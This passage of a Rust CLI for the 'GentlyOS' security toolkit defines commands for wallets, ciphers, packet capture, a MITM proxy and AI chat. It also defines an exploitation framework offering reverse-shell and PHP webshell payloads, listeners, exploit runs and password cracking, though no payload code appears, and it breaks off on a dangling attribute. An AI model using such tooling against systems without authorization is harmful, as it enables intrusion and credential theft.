//! GentlyOS CLI
//!
//! Command-line interface for the GentlyOS security system.
#![allow(dead_code, unused_variables, unused_imports, unused_mut, unexpected_cfgs)]

mod report;
mod chat;

use clap::{Parser, Subcommand};
use anyhow::Result;
use sha2::Digest;

use gently_core::{GenesisKey, PatternEncoder, Lock, Key, KeyVault, ServiceConfig};
use gently_core::crypto::xor::split_secret;
use gently_feed::{FeedStorage, ItemKind, LivingFeed};
use gently_search::{ContextRouter, Thought, ThoughtIndex};
use gently_mcp::{McpServer, McpHandler};
use gently_dance::{DanceSession, Contract};
use gently_visual::VisualEngine;

// New crate imports
use gently_cipher::{Cipher, Encoding, Hashes, HashIdentifier, CipherIdentifier};
use gently_cipher::analysis::FrequencyAnalysis;
use gently_cipher::{Cracker, RainbowTable, RainbowHashType, TableGenerator, Wordlist, BruteForce};
use gently_network::PacketCapture;
use gently_architect::{IdeaCrystal, ProjectTree, FlowChart};
use gently_brain::{ModelDownloader, Embedder, TensorChain, ClaudeClient, ClaudeModel, GentlyAssistant};
// gently-ipfs imported as needed within functions
use gently_sploit::{Framework, SploitConsole, console::banner};

// gently-spl disabled due to Solana version conflicts - stub types for CLI compilation
mod spl_stub {
    use std::fmt;

    #[derive(Clone)]
    pub struct NftMetadata { pub name: String, pub symbol: String, pub uri: String }

    pub struct GentlyNft { pub metadata: NftMetadata }
    impl GentlyNft {
        pub fn mint(_wallet: &GentlyWallet, name: &str) -> anyhow::Result<Self> {
            Ok(Self { metadata: NftMetadata { name: name.to_string(), symbol: "GNTLY".to_string(), uri: String::new() } })
        }
        pub fn mint_base58(&self) -> String { "stub_mint".to_string() }
        pub fn holder_base58(&self) -> String { "stub_holder".to_string() }
        pub fn qr_code(&self) -> String { "stub_qr".to_string() }
    }

    #[derive(Clone)]
    pub struct GentlyWallet { pub pubkey: [u8; 32] }
    impl GentlyWallet {
        pub fn new() -> Self { Self { pubkey: [0u8; 32] } }
        pub fn from_genesis(_key: &[u8]) -> Self { Self { pubkey: [0u8; 32] } }
        pub fn pubkey_bytes(&self) -> &[u8] { &self.pubkey }
        pub fn pubkey(&self) -> String { "stub_pubkey".to_string() }
        pub fn derivation_path(&self) -> String { "m/44'/501'/0'/0'".to_string() }
    }

    pub struct WalletStore { pub network: Network }
    impl WalletStore {
        pub fn new(_network: Network) -> Self { Self { network: Network::Devnet } }
        pub fn load() -> Option<Self> { None }
        pub fn active(&self) -> Option<GentlyWallet> { None }
        pub fn add(&mut self, _wallet: GentlyWallet) {}
        pub fn set_active(&mut self, _idx: usize) {}
        pub fn wallets(&self) -> Vec<GentlyWallet> { vec![] }
        pub fn save(&self) -> Result<(), std::io::Error> { Ok(()) }
        pub fn to_json(&self) -> String { "{}".to_string() }
    }

    #[derive(Clone, Copy, Debug)]
    pub enum Network { Devnet, Testnet, Mainnet }
    impl Network {
        pub fn name(&self) -> &'static str { match self { Self::Devnet => "devnet", Self::Testnet => "testnet", Self::Mainnet => "mainnet" } }
        pub fn rpc_url(&self) -> &'static str { "https://api.devnet.solana.com" }
    }
    impl std::str::FromStr for Network {
        type Err = ();
        fn from_str(s: &str) -> Result<Self, Self::Err> {
            match s { "devnet" => Ok(Self::Devnet), "testnet" => Ok(Self::Testnet), "mainnet" => Ok(Self::Mainnet), _ => Ok(Self::Devnet) }
        }
    }

    pub struct GntlyToken;
    impl GntlyToken {
        pub fn devnet() -> Self { Self }
        pub fn balance(&mut self, _pubkey: &[u8]) -> u64 { 0 }
    }

    pub struct TokenAmount(pub u64);

    pub struct CertificationManager;
    impl CertificationManager {
        pub fn new() -> Self { Self }
        pub fn token(&self) -> TokenBalance { TokenBalance }
    }

    pub struct TokenBalance;
    impl TokenBalance {
        pub fn balance(&self, _: &[u8]) -> Balance { Balance }
    }

    pub struct Balance;
    impl Balance {
        pub fn sufficient_for(&self, _: u64) -> bool { true }
    }

    pub struct PermissionManager { pub level: GovernanceLevel }
    impl PermissionManager {
        pub fn new(_owner: &str, _stake: TokenAmount) -> Self { Self { level: GovernanceLevel::User } }
        pub fn can_read(&self) -> bool { true }
        pub fn can_write(&self) -> bool { true }
        pub fn can_admin(&self) -> bool { matches!(self.level, GovernanceLevel::Admin | GovernanceLevel::Root) }
    }

    pub enum AuditType { Full, Quick }
    pub struct Installer;
    pub struct GentlyInstall;
    pub struct GosToken;
    pub enum OwnerType { User, System }

    #[derive(Clone)]
    pub struct TokenGenerator { pub genesis_hash: [u8; 32] }
    impl TokenGenerator {
        pub fn new() -> Self { Self { genesis_hash: [0u8; 32] } }
    }

    #[derive(Clone)]
    pub struct GovernanceSystem {
        pub level: GovernanceLevel,
        pub root_wallet: GentlyWallet,
        pub admin_wallet: GentlyWallet,
        pub developer_wallet: GentlyWallet,
        pub token_gen: TokenGenerator,
    }
    impl GovernanceSystem {
        pub fn new(_network: Network, level: GovernanceLevel, _key: &[u8], _stake: f64) -> Self {
            Self {
                level,
                root_wallet: GentlyWallet::new(),
                admin_wallet: GentlyWallet::new(),
                developer_wallet: GentlyWallet::new(),
                token_gen: TokenGenerator::new(),
            }
        }
        pub fn level(&self) -> &GovernanceLevel { &self.level }
        pub fn initialize_folders(&self) -> anyhow::Result<()> { Ok(()) }
        pub fn hierarchy_tree(&self) -> String { "GovernanceHierarchy\n├── Root\n├── Admin\n└── User".to_string() }
        pub fn to_json(&self) -> String { "{}".to_string() }
    }

    #[derive(Clone, Copy, Debug)]
    pub enum GovernanceLevel { Guest, User, Developer, Service, System, Admin, Root }
    impl fmt::Display for GovernanceLevel {
        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result { write!(f, "{:?}", self) }
    }

    pub const ROOT_TOKEN_AMOUNT: u64 = 1_000_000;
    pub const ADMIN_TOKEN_COUNT: u64 = 10;

    pub struct GenosEconomy;
    impl GenosEconomy {
        pub fn new(_network: Network) -> Self { Self }
    }

    pub struct GenosAmount(pub u64);
    pub enum ContributionType { Compute, Storage, Bandwidth }
    pub enum GpuJobType { Inference, Training }

    pub mod nft {
        pub struct UnlockContract;
        impl UnlockContract { pub fn open(_: &[u8]) -> Self { Self } }
    }
    pub mod token {
        pub mod pricing {
            pub const DEVNET_UNLOCK_STAKE: u64 = 1000;
            pub const HIVE_QUERY: u64 = 10;
            pub const CHAIN_SUBMIT: u64 = 100;
            pub const CHAIN_REWARD: u64 = 50;
            pub const MIN_STAKE: u64 = 100;
            pub const PREMIUM_MONTHLY: u64 = 1000;
        }
        pub mod certification {
            pub const DANCE_SWAP: u64 = 100;
            pub const ABORT_PENALTY: u64 = 50;
            pub const VERIFICATION_BONUS: u64 = 25;
        }
    }
    pub mod permissions {
        pub const ROOT_STAKE_PERCENT: f64 = 0.51;
        pub const AUDIT_SWAP_AMOUNT: u64 = 1000;
    }
    pub const GENOS_SYMBOL: &str = "GENOS";
    pub const GENOS_NAME: &str = "GentlyOS Token";
    pub const GENOS_DECIMALS: u8 = 9;
    pub const GENOS_TOTAL_SUPPLY: u64 = 1_000_000_000_000_000_000;
}
use spl_stub::*;

#[derive(Parser)]
#[command(name = "gently")]
#[command(about = "GentlyOS - Cryptographic security with visual-audio authentication")]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Install GentlyOS - initialize filesystem with wallets and GOS token
    Install {
        /// Total stake supply in GOS tokens
        #[arg(short, long, default_value = "1000")]
        stake: f64,

        /// Network (devnet, testnet, mainnet)
        #[arg(short, long, default_value = "devnet")]
        network: String,

        /// Seed phrase for deterministic genesis
        #[arg(long)]
        seed: Option<String>,

        /// Output installation JSON to file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Generate a new genesis key
    Init {
        /// Optional seed phrase for recovery
        #[arg(short, long)]
        seed: Option<String>,

        /// Salt for seed derivation
        #[arg(long, default_value = "gently-default")]
        salt: String,

        /// Non-interactive mode (for scripts)
        #[arg(long)]
        non_interactive: bool,
    },

    /// Run first-time setup wizard
    Setup {
        /// Skip embedding model download
        #[arg(long)]
        skip_models: bool,

        /// Force re-initialization
        #[arg(short, long)]
        force: bool,
    },

    /// Create a new project with Lock/Key pair
    Create {
        /// Project name
        name: String,

        /// Description
        #[arg(short, long, default_value = "")]
        description: String,

        /// BTC block height for expiry (optional)
        #[arg(long)]
        expires: Option<u64>,
    },

    /// Generate visual pattern from a hash
    Pattern {
        /// Hex-encoded hash (64 chars)
        hash: String,

        /// Output SVG file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Split a secret into Lock + Key
    Split {
        /// Hex-encoded secret (64 chars)
        secret: String,
    },

    /// Combine Lock + Key to recover secret
    Combine {
        /// Hex-encoded lock (64 chars)
        lock: String,

        /// Hex-encoded key (64 chars)
        key: String,
    },

    /// Mint an NFT containing a KEY
    Mint {
        /// Project name to mint for
        project: String,

        /// Visual URI (IPFS, HTTP, etc)
        #[arg(short, long, default_value = "ipfs://placeholder")]
        visual: String,
    },

    /// Show system status
    Status,

    /// Demo the dance protocol (simulation)
    Demo,

    // ===== WALLET COMMANDS =====

    /// Generate a new GentlyOS wallet (locked to genesis key)
    Wallet {
        #[command(subcommand)]
        command: WalletCommands,
    },

    /// GNTLY token operations
    Token {
        #[command(subcommand)]
        command: TokenCommands,
    },

    /// Certification via Dance (devnet token swap)
    Certify {
        #[command(subcommand)]
        command: CertifyCommands,
    },

    /// Hierarchical permission stake system
    Perm {
        #[command(subcommand)]
        command: PermCommands,
    },

    /// GENOS - Proof-of-Thought token (valuable token for AI/GPU)
    Genos {
        #[command(subcommand)]
        command: GenosCommands,
    },

    /// Living Feed - self-tracking context system
    Feed {
        #[command(subcommand)]
        command: FeedCommands,
    },

    /// Thought Index - semantic search and knowledge base
    Search {
        #[command(subcommand)]
        command: SearchCommands,
    },

    /// Alexandria - Distributed knowledge mesh
    Alexandria {
        #[command(subcommand)]
        command: AlexandriaCommands,
    },

    /// MCP Server - Claude integration via Model Context Protocol
    Mcp {
        #[command(subcommand)]
        command: McpCommands,
    },

    /// Cipher-Mesh - Cipher identification, encoding/decoding, cryptanalysis
    Cipher {
        #[command(subcommand)]
        command: CipherCommands,
    },

    /// Network security - packet capture, MITM proxy, visualization
    Network {
        #[command(subcommand)]
        command: NetworkCommands,
    },

    /// Brain - Local LLM, embeddings, TensorChain
    Brain {
        #[command(subcommand)]
        command: BrainCommands,
    },

    /// Architect - Idea crystallization, flowcharts, recall engine
    Architect {
        #[command(subcommand)]
        command: ArchitectCommands,
    },

    /// IPFS - Decentralized storage operations
    Ipfs {
        #[command(subcommand)]
        command: IpfsCommands,
    },

    /// Sploit - Exploitation framework (authorized testing only)
    Sploit {
        #[command(subcommand)]
        command: SploitCommands,
    },

    /// Crack - Password cracking tools
    Crack {
        #[command(subcommand)]
        command: CrackCommands,
    },

    /// Claude - AI assistant powered by Anthropic
    Claude {
        #[command(subcommand)]
        command: ClaudeCommands,
    },

    /// Vault - Encrypted API key storage in IPFS
    Vault {
        #[command(subcommand)]
        command: VaultCommands,
    },

    /// Interactive TUI dashboard report
    Report,

    /// Local AI chat (TinyLlama - runs offline, no API costs)
    Chat,
}

#[derive(Subcommand)]
enum ClaudeCommands {
    /// Chat with Claude (conversational)
    Chat {
        /// Your message
        message: String,

        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,
    },

    /// Ask Claude a one-off question (no history)
    Ask {
        /// Your question
        question: String,

        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,
    },

    /// Interactive REPL session with Claude
    Repl {
        /// Model: sonnet, opus, haiku
        #[arg(short, long, default_value = "sonnet")]
        model: String,

        /// System prompt override
        #[arg(short, long)]
        system: Option<String>,
    },

    /// Show Claude status and configuration
    Status,
}

#[derive(Subcommand)]
enum VaultCommands {
    /// Add or update an API key
    Set {
        /// Service name (anthropic, openai, github, etc.)
        service: String,
        /// API key value
        key: String,
    },

    /// Get an API key (outputs to stdout)
    Get {
        /// Service name
        service: String,
        /// Also export to environment variable
        #[arg(short, long)]
        export: bool,
    },

    /// Remove an API key
    Remove {
        /// Service name
        service: String,
    },

    /// List all stored services
    List,

    /// Export all keys to environment
    Export,

    /// Save vault to IPFS
    Save,

    /// Load vault from IPFS
    Load {
        /// IPFS CID of vault
        cid: String,
    },

    /// Show vault status
    Status,

    /// Show known services
    Services,
}

#[derive(Subcommand)]
enum WalletCommands {
    /// Create a new wallet from genesis key
    Create {
        /// Network (devnet, testnet, mainnet)
        #[arg(short, long, default_value = "devnet")]
        network: String,

        /// Seed phrase for genesis key
        #[arg(short, long)]
        seed: Option<String>,
    },

    /// Show wallet info
    Info {
        /// Wallet file path
        #[arg(short, long, default_value = "~/.gently/wallet.json")]
        file: String,
    },

    /// Export wallet public key
    Pubkey,

    /// Sign a message
    Sign {
        /// Message to sign
        message: String,
    },
}

#[derive(Subcommand)]
enum TokenCommands {
    /// Show GNTLY balance
    Balance {
        /// Wallet pubkey (optional, uses local wallet if not provided)
        pubkey: Option<String>,
    },

    /// Airdrop GNTLY tokens (devnet only)
    Airdrop {
        /// Amount in GNTLY
        #[arg(short, long, default_value = "100")]
        amount: f64,
    },

    /// Transfer GNTLY tokens
    Transfer {
        /// Recipient pubkey
        to: String,

        /// Amount in GNTLY
        amount: f64,
    },

    /// Stake GNTLY for hive access
    Stake {
        /// Amount in GNTLY
        amount: f64,
    },

    /// Show token info
    Info,
}

#[derive(Subcommand)]
enum CertifyCommands {
    /// Initialize a Dance certification with another device
    Init {
        /// Other device's pubkey
        peer: String,
    },

    /// Complete a Dance certification
    Complete {
        /// Session hash (hex)
        session: String,
    },

    /// Abort a Dance certification
    Abort {
        /// Session hash (hex)
        session: String,
    },

    /// Show certification history
    History,

    /// Show certification pricing info
    Info,
}

#[derive(Subcommand)]
enum PermCommands {
    /// Initialize permission tree with root stake
    Init {
        /// Total stake in GNTLY
        #[arg(short, long, default_value = "100")]
        stake: f64,
    },

    /// Add a path to the permission tree
    Add {
        /// Path to add (e.g., /home/user)
        path: String,

        /// Owner pubkey (defaults to self)
        #[arg(short, long)]
        owner: Option<String>,

        /// Is this a directory?
        #[arg(short, long, default_value = "true")]
        dir: bool,
    },

    /// Attempt to edit a path
    Edit {
        /// Path to edit
        path: String,
    },

    /// Show stake hierarchy
    Tree,

    /// Show audit history
    Audits,

    /// Check system health (audit balance)
    Health,

    /// Show permission system info
    Info,
}

#[derive(Subcommand)]
enum GenosCommands {
    /// Show GENOS balance
    Balance,

    /// Submit a contribution for GENOS reward
    Contribute {
        /// Contribution type (thought, report, code, research, design)
        #[arg(short, long, default_value = "thought")]
        kind: String,

        /// Title/summary
        title: String,
    },

    /// Register as GPU provider
    GpuRegister {
        /// GPU model name
        model: String,

        /// VRAM in GB
        #[arg(short, long)]
        vram: u32,

        /// Hourly rate in GENOS
        #[arg(short, long, default_value = "1.0")]
        rate: f64,
    },

    /// Submit GPU job
    GpuJob {
        /// Job type (inference, training, finetuning, embedding)
        #[arg(short, long, default_value = "inference")]
        kind: String,

        /// Estimated hours
        #[arg(short, long, default_value = "1.0")]
        hours: f32,

        /// GENOS budget
        #[arg(short, long, default_value = "5.0")]
        budget: f64,
    },

    /// Add vector chain contribution
    Vector {
        /// Metadata/description
        metadata: String,
    },

    /// Show GENOS economy stats
    Stats,

    /// Show GENOS token info
    Info,
}

#[derive(Subcommand)]
enum FeedCommands {
    /// Show current Living Feed state
    Show {
        /// Filter: hot, active, cooling, frozen, all
        #[arg(short, long, default_value = "all")]
        filter: String,
    },

    /// Add a new item to the feed
    Add {
        /// Item name
        name: String,

        /// Item kind (project, task, idea, reference)
        #[arg(short, long, default_value = "project")]
        kind: String,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Boost an item's charge
    Boost {
        /// Item name to boost
        name: String,

        /// Boost amount (0.1-1.0)
        #[arg(short, long, default_value = "0.3")]
        amount: f32,
    },

    /// Add a step to an item
    Step {
        /// Item name
        item: String,

        /// Step content
        step: String,
    },

    /// Mark a step as done
    Done {
        /// Item name
        item: String,

        /// Step number
        step_id: u32,
    },

    /// Freeze an item
    Freeze {
        /// Item name
        name: String,
    },

    /// Archive an item
    Archive {
        /// Item name
        name: String,
    },

    /// Process text for mentions and context
    Process {
        /// Text to process
        text: String,
    },

    /// Export feed to markdown
    Export {
        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[derive(Subcommand)]
enum SearchCommands {
    /// Add a thought to the index
    Add {
        /// Thought content
        content: String,

        /// Source (optional)
        #[arg(short, long)]
        source: Option<String>,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Search the thought index
    Query {
        /// Search query
        query: String,

        /// Maximum results
        #[arg(short, long, default_value = "10")]
        limit: usize,

        /// Use feed context for boosting
        #[arg(long)]
        feed: bool,
    },

    /// Show index statistics
    Stats,

    /// Show recent thoughts
    Recent {
        /// Number of thoughts
        #[arg(short, long, default_value = "10")]
        limit: usize,
    },

    /// Show thoughts in a domain
    Domain {
        /// Domain index (0-71)
        domain: u8,
    },
}

#[derive(Subcommand)]
enum AlexandriaCommands {
    /// Show Alexandria mesh status
    Status,

    /// Query the distributed knowledge graph
    Query {
        /// Concept to query
        concept: String,

        /// Include historical data
        #[arg(long)]
        history: bool,

        /// Include drift analysis
        #[arg(long)]
        drift: bool,
    },

    /// Show mesh topology for a concept
    Topology {
        /// Concept to explore
        concept: String,

        /// Maximum hops
        #[arg(short, long, default_value = "2")]
        hops: usize,
    },

    /// Show connected nodes in the mesh
    Nodes,

    /// Sync with the mesh network
    Sync,

    /// Show contribution proof for rewards
    Proof,

    /// Export graph to file
    Export {
        /// Output file
        #[arg(short, long, default_value = "alexandria.json")]
        output: String,
    },
}

#[derive(Subcommand)]
enum McpCommands {
    /// Start MCP server (stdio mode)
    Serve,

    /// List available MCP tools
    Tools,

    /// Show MCP server info
    Info,
}

#[derive(Subcommand)]
enum CipherCommands {
    /// Identify cipher/encoding/hash type
    Identify {
        /// Input string to identify
        input: String,
    },

    /// Encode text with various algorithms
    Encode {
        /// Encoding type: base64, hex, binary, morse, rot13, rot47, url
        #[arg(short, long)]
        algo: String,

        /// Text to encode
        text: String,
    },

    /// Decode text with various algorithms
    Decode {
        /// Encoding type: base64, hex, binary, morse, rot13, rot47, url
        #[arg(short, long)]
        algo: String,

        /// Text to decode
        text: String,
    },

    /// Encrypt with classic ciphers
    Encrypt {
        /// Cipher: caesar, vigenere, atbash, affine, railfence, xor
        #[arg(short, long)]
        cipher: String,

        /// Key or shift value
        #[arg(short, long)]
        key: String,

        /// Text to encrypt
        text: String,
    },

    /// Decrypt with classic ciphers
    Decrypt {
        /// Cipher: caesar, vigenere, atbash, affine, railfence, xor
        #[arg(short, long)]
        cipher: String,

        /// Key or shift value
        #[arg(short, long)]
        key: String,

        /// Text to decrypt
        text: String,
    },

    /// Brute force Caesar cipher
    Bruteforce {
        /// Ciphertext
        text: String,
    },

    /// Hash data with various algorithms
    Hash {
        /// Algorithm: md5, sha1, sha256, sha512, all
        #[arg(short, long, default_value = "all")]
        algo: String,

        /// Data to hash
        data: String,
    },

    /// Frequency analysis
    Analyze {
        /// Text to analyze
        text: String,

        /// Show ASCII chart
        #[arg(long)]
        chart: bool,
    },
}

#[derive(Subcommand)]
enum NetworkCommands {
    /// List network interfaces
    Interfaces,

    /// Capture packets (requires tshark)
    Capture {
        /// Interface name
        #[arg(short, long)]
        interface: String,

        /// BPF filter
        #[arg(short, long)]
        filter: Option<String>,

        /// Number of packets to capture
        #[arg(short, long)]
        count: Option<usize>,

        /// Output pcap file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Read pcap file
    Read {
        /// PCAP file path
        file: String,

        /// Display filter (Wireshark syntax)
        #[arg(short, long)]
        filter: Option<String>,
    },

    /// Extract HTTP requests from pcap
    HttpExtract {
        /// PCAP file path
        file: String,
    },

    /// Extract DNS queries from pcap
    DnsExtract {
        /// PCAP file path
        file: String,
    },

    /// Start MITM proxy
    Proxy {
        /// Listen port
        #[arg(short, long, default_value = "8080")]
        port: u16,

        /// Intercept mode: passthrough, intercept
        #[arg(short, long, default_value = "passthrough")]
        mode: String,
    },

    /// HTTP repeater - replay requests
    Repeat {
        /// Request file (raw HTTP)
        request: String,

        /// Target URL
        #[arg(short, long)]
        url: Option<String>,
    },

    /// Visualize network topology
    Visualize {
        /// Output SVG file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Show common BPF filters
    Filters,
}

#[derive(Subcommand)]
enum BrainCommands {
    /// Download models from HuggingFace
    Download {
        /// Model: llama-1b, embedder
        #[arg(short, long, default_value = "llama-1b")]
        model: String,
    },

    /// Embed text to vector
    Embed {
        /// Text to embed
        text: String,
    },

    /// Run local inference
    Infer {
        /// Prompt
        prompt: String,

        /// Max tokens
        #[arg(short, long, default_value = "256")]
        max_tokens: usize,
    },

    /// TensorChain - add code memory
    Learn {
        /// Code or concept to learn
        content: String,

        /// Category
        #[arg(short, long, default_value = "code")]
        category: String,
    },

    /// TensorChain - query knowledge
    Query {
        /// Query string
        query: String,

        /// Number of results
        #[arg(short, long, default_value = "5")]
        limit: usize,
    },

    /// Show brain status
    Status,

    /// Start the brain orchestrator (awareness loop + daemons)
    Orchestrate {
        /// Enable IPFS sync
        #[arg(long, default_value = "false")]
        ipfs: bool,

        /// Show daemon events
        #[arg(long, default_value = "false")]
        verbose: bool,
    },

    /// List available skills
    Skills {
        /// Filter by category
        #[arg(short, long)]
        category: Option<String>,
    },

    /// List available MCP tools
    Tools {
        /// Filter by category
        #[arg(short, long)]
        category: Option<String>,
    },

    /// Manage background daemons
    Daemon {
        #[command(subcommand)]
        action: DaemonAction,
    },

    /// Knowledge graph operations
    Knowledge {
        #[command(subcommand)]
        action: KnowledgeAction,
    },

    /// Process a thought through the awareness loop
    Think {
        /// The thought to process
        thought: String,
    },

    /// Focus attention on a topic
    Focus {
        /// Topic to focus on
        topic: String,
    },

    /// Trigger growth in a domain
    Grow {
        /// Domain to grow in
        domain: String,
    },

    /// Get current awareness state
    Awareness,
}

#[derive(Subcommand)]
enum DaemonAction {
    /// List running daemons
    List,
    /// Spawn a new daemon
    Spawn {
        /// Daemon type: vector_chain, ipfs_sync, git_branch, knowledge_graph, awareness, inference
        daemon_type: String,
    },
    /// Stop a daemon
    Stop {
        /// Daemon name
        name: String,
    },
    /// Get daemon metrics
    Metrics {
        /// Daemon name
        name: String,
    },
}

#[derive(Subcommand)]
enum KnowledgeAction {
    /// Add knowledge
    Add {
        /// Concept name
        concept: String,
        /// Context/content
        #[arg(short, long)]
        context: Option<String>,
    },
    /// Search knowledge
    Search {
        /// Query string
        query: String,
        /// Depth of related nodes to fetch
        #[arg(short, long, default_value = "1")]
        depth: usize,
    },
    /// Infer new knowledge
    Infer {
        /// Starting concept
        premise: String,
        /// Max inference steps
        #[arg(short, long, default_value = "3")]
        steps: usize,
    },
    /// Find similar concepts
    Similar {
        /// Concept to find similar to
        concept: String,
        /// Number of results
        #[arg(short, long, default_value = "5")]
        count: usize,
    },
    /// Export knowledge graph
    Export {
        /// Output file (JSON)
        #[arg(short, long, default_value = "knowledge.json")]
        output: String,
    },
    /// Show graph stats
    Stats,
}

#[derive(Subcommand)]
enum ArchitectCommands {
    /// Create a new idea
    Idea {
        /// Idea content
        content: String,

        /// Project context
        #[arg(short, long)]
        project: Option<String>,
    },

    /// Confirm an idea (embed it)
    Confirm {
        /// Idea ID
        id: String,
    },

    /// Crystallize an idea (finalize)
    Crystallize {
        /// Idea ID
        id: String,
    },

    /// Create flowchart
    Flow {
        /// Flowchart name
        name: String,

        /// Export format: ascii, svg
        #[arg(short, long, default_value = "ascii")]
        format: String,
    },

    /// Add node to flowchart
    Node {
        /// Flowchart name
        flow: String,

        /// Node label
        label: String,

        /// Node type: process, decision, io, start, end
        #[arg(short, long, default_value = "process")]
        kind: String,
    },

    /// Add edge to flowchart
    Edge {
        /// Flowchart name
        flow: String,

        /// From node ID
        from: String,

        /// To node ID
        to: String,

        /// Edge label
        #[arg(short, long)]
        label: Option<String>,
    },

    /// Show project tree
    Tree {
        /// Root path
        #[arg(short, long, default_value = ".")]
        path: String,
    },

    /// Query recall engine
    Recall {
        /// Query
        query: String,
    },

    /// Export session
    Export {
        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },
}

#[derive(Subcommand)]
enum IpfsCommands {
    /// Add file to IPFS
    Add {
        /// File path
        file: String,

        /// Pin locally
        #[arg(short, long)]
        pin: bool,
    },

    /// Get file from IPFS
    Get {
        /// CID
        cid: String,

        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Pin content
    Pin {
        /// CID to pin
        cid: String,

        /// Remote pinning service
        #[arg(short, long)]
        remote: Option<String>,
    },

    /// List pinned content
    Pins,

    /// Store thought to IPFS
    StoreThought {
        /// Thought content
        content: String,

        /// Tags (comma-separated)
        #[arg(short, long)]
        tags: Option<String>,
    },

    /// Retrieve thought from IPFS
    GetThought {
        /// CID
        cid: String,
    },

    /// Show IPFS node status
    Status,
}

#[derive(Subcommand)]
enum SploitCommands {
    /// Start interactive console (msfconsole style)
    Console,

    /// Search for modules
    Search {
        /// Search query
        query: String,
    },

    /// Generate shell payload
    Payload {
        /// Payload type: reverse_bash, reverse_python, webshell_php
        #[arg(short, long, default_value = "reverse_bash")]
        payload_type: String,

        /// Local host for reverse shell
        #[arg(short = 'H', long)]
        lhost: Option<String>,

        /// Local port for reverse shell
        #[arg(short = 'P', long, default_value = "4444")]
        lport: u16,

        /// Target OS: linux, windows, macos
        #[arg(short, long, default_value = "linux")]
        os: String,
    },

    /// Generate listener command
    Listener {
        /// Port to listen on
        #[arg(short, long, default_value = "4444")]
        port: u16,
    },

    /// Scan target for vulnerabilities
    Scan {
        /// Target host
        target: String,

        /// Scan type: port, service, vuln
        #[arg(short, long, default_value = "port")]
        scan_type: String,
    },

    /// Run exploit module
    Exploit {
        /// Module name
        module: String,

        /// Target host
        #[arg(short, long)]
        target: Option<String>,
    },

    /// Show available exploits
    List {
        /// Category: http, ssh, smb, local
        #[arg(short, long)]
        category: Option<String>,
    },
}

#[derive(Subcommand)]
enum CrackCommands {
    /// Dictionary attack on hash
    Dictionary {
        /// Hash to crack
        hash: String,

        /// Wordlist file
        #[arg(short, long)]
        wordlist: Option<String>,

        /// Hash type: md5, sha1, sha256, ntlm, auto
        #[arg(short = 't', long, default_value = "auto")]
        hash_type: String,

        /// Use mutation rules
        #[arg(short, long)]
        rules: bool,
    },

    /// Bruteforce attack
    Bruteforce {
        /// Hash to crack
        hash: String,

        /// Character set: lower, alpha, alnum, all
        #[arg(short, long, default_value = "lower")]
        charset: String,

        /// Maximum length
        #[arg(short, long, default_value = "6")]
        max_len: usize,
    },

    /// Rainbow table lookup
    Rainbow {
        /// Hash to lookup
        hash: String,

        /// Hash type: md5, sha1, ntlm
        #[arg(short = 't', long, default_value = "md5")]
        hash_type: String,

        /// Rainbow table file
        #[arg(short, long)]
        table: Option<String>,
    },

    /// Generate rainbow table
    Generate {
        /// Output file
        output: String,

        /// Hash type: md5, sha1, ntlm
        #[arg(short = 't', long, default_value = "md5")]
        hash_type: String,

        /// Wordlist to hash
        #[arg(short, long)]
        wordlist: Option<String>,

        /// Generate numeric table (max digits)
        #[arg(short, long)]
        numeric: Option<usize>,
    },

    /// Show common passwords
    Wordlist,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Install { stake, network, seed, output } => cmd_install(stake, network, seed, output),
        Commands::Init { seed, salt, non_interactive } => cmd_init(seed, salt, non_interactive),
        Commands::Setup { skip_models, force } => cmd_setup(skip_models, force),
        Commands::Create { name, description, expires } => cmd_create(name, description, expires),
        Commands::Pattern { hash, output } => cmd_pattern(hash, output),
        Commands::Split { secret } => cmd_split(secret),
        Commands::Combine { lock, key } => cmd_combine(lock, key),
        Commands::Mint { project, visual } => cmd_mint(project, visual),
        Commands::Status => cmd_status(),
        Commands::Demo => cmd_demo(),
        Commands::Wallet { command } => cmd_wallet(command),
        Commands::Token { command } => cmd_token(command),
        Commands::Certify { command } => cmd_certify(command),
        Commands::Perm { command } => cmd_perm(command),
        Commands::Genos { command } => cmd_genos(command),
        Commands::Feed { command } => cmd_feed(command),
        Commands::Search { command } => cmd_search(command),
        Commands::Alexandria { command } => cmd_alexandria(command),
        Commands::Mcp { command } => cmd_mcp(command),
        Commands::Cipher { command } => cmd_cipher(command),
        Commands::Network { command } => cmd_network(command),
        Commands::Brain { command } => cmd_brain(command),
        Commands::Architect { command } => cmd_architect(command),
        Commands::Ipfs { command } => cmd_ipfs(command),
        Commands::Sploit { command } => cmd_sploit(command),
        Commands::Crack { command } => cmd_crack(command),
        Commands::Claude { command } => cmd_claude(command),
        Commands::Vault { command } => cmd_vault(command),
        Commands::Report => {
            report::run_report().map_err(|e| anyhow::anyhow!("TUI error: {}", e))
        }
        Commands::Chat => {
            run_local_chat()
        }
    }
}

// Global state for demo purposes (in production, use proper storage)
// These are used when SPL is enabled - suppress warnings while disabled
#[allow(dead_code)]
use std::sync::Mutex;

static DEMO_GENESIS: Mutex<Option<[u8; 32]>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_TOKEN: Mutex<Option<GntlyToken>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_CERTIFICATION: Mutex<Option<CertificationManager>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_PERMISSIONS: Mutex<Option<PermissionManager>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_INSTALL: Mutex<Option<GentlyInstall>> = Mutex::new(None);
#[allow(dead_code)]
static DEMO_GOS_TOKEN: Mutex<Option<GosToken>> = Mutex::new(None);
#[allow(dead_code)]
